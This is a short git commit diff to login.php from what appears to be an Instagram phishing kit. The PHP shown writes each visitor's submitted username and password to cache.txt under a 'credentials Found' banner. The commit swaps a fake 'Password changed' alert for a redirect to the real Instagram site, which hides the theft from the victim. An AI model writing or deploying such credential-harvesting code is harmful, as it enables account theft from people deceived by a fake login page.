ac272d5abedd5829a96ace631e0c06234f9c84f5
cortian <79749427+Cortian@users.noreply.github.com>
2021-05-28 23:40:24 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
 file_put_contents("cache.txt","\n"."[+] credentials Found[+]"."\n"."Username - " . $_POST['username'] . "\n" . "Password - " . $_POST['password'] . "\n",FILE_APPEND);
-echo "<script>alert('Password changed')</script>";
-?>
+header("Location: https://www.instagram.com/");
+?>'
 
